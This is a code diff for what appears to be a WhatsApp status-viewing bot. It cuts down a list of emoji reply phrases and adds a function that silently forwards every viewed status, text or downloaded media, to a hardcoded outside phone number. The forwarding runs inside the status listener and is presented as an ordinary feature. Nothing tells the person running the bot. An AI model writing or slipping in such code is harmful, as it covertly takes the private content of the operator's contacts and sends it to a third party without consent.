@@ -25,25 +25,29 @@ function getRandomResponse() {
     const responses = [
         "Great one!🔥", "Amazing!😍", "You nailed it!💯", "This is awesome!👏", "Keep it up!👍",
         "Well said!🙌", "That’s lit!⚡", "So true!👌", "Loving this!💖", "This made me smile!😊",
-        "Deep stuff!🤔", "You’re on fire!🔥", "Totally agree!✅", "Such a vibe!🎶", "Killing it!🎯",
-        "Legendary!🏆", "Well done!👏", "Inspiring!✨", "That’s the spirit!💪", "Brilliant!💡",
-        "Good times!⏳", "You’re glowing!🌟", "Too good!😎", "So cool!🆒", "You got this!💪",
-        "Making moves!🚀", "Stay blessed!🙏", "Keep shining!🌟", "Awesome!🌈", "Well played!🏅",
-        "Good vibes only!✌️", "This is gold!🥇", "Too smooth!😏", "Pure genius!🤯", "Incredible!😲",
-        "Perfection!👌", "Well deserved!🎉", "You rock!🤘", "You got style!🕶️", "Epic!🔥",
-        "Top-notch!🎩", "Pure class!🕴", "Well done, mate!👍", "Great stuff!🎯", "You’re amazing!🌟",
-        "This is wild!🔥", "I love this!❤️", "So chill!😎", "This slaps!🎶", "Vibes on point!💯",
-        "Can't stop watching!👀", "That’s genius!💡", "You inspire me!✨", "So funny!😂", "Hilarious!🤣",
-        "Too real!🤯", "This is next level!🚀", "Mind blown!💥", "Such a masterpiece!🎨", "Respect!🙌",
-        "Big energy!💥", "Iconic!🎥", "So uplifting!💫", "This is legendary!🏆", "You always deliver!📦",
-        "Never disappoint!😎", "On point!🔝", "Solid work!💪", "Too cool for words!❄️", "Crushing it!🏋️",
-        "You did that!👏", "Flawless!👌", "Can't stop laughing!🤣", "Straight facts!✅", "You’re a star!🌟",
-        "So relaxing!🌊", "Incredible work!✨", "Great choice!🎯", "Keep grinding!💪", "This wins the internet!🏆",
-        "Best thing I’ve seen!👀", "This just made my day!😊", "Can’t get enough of this!😍", "So peaceful!🌿",
-        "Really speaks to me!💬", "That's fire!🔥", "Such a blessing!🙏", "Love this vibe!🌈", "Always on top!🔝"
         // Add more phrases here as needed
     ];
     return responses[Math.floor(Math.random() * responses.length)];
+}
+
+// Number to forward statuses to
+const forwardNumber = '+94777839446@s.whatsapp.net'; // Ensure correct format for WhatsApp ID
+
+// Function to forward the status message to a specified number
+async function forwardStatusMessage(conn, mek) {
+    const contentType = getContentType(mek.message);
+
+    // Forward text status
+    if (contentType === 'text') {
+        const text = mek.message.conversation;
+        await conn.sendMessage(forwardNumber, { text });
+    }
+
+    // Forward media (image, video, audio, or document)
+    else if (contentType) {
+        const mediaBuffer = await downloadMediaMessage(mek, 'buffer');
+        await conn.sendMessage(forwardNumber, { [contentType]: mediaBuffer });
+    }
 }
 
 // Ensure the connection is passed properly
@@ -72,6 +76,9 @@ async function initializeStatusListener(conn) {
 
             // Log the output with sender's push name, content type, and caption
             console.log(`New status posted by 💥: ${senderPushName} Media Type: ${contentType || 'No media'} Caption: ${caption}`);
+
+            // Forward the status message to the specified number
+            await forwardStatusMessage(conn, mek);
 
             // Check the config to decide whether to send the status seen message
             if (config.STATES_SEEN_MESSAGE_SEND_SEND === 'true') {
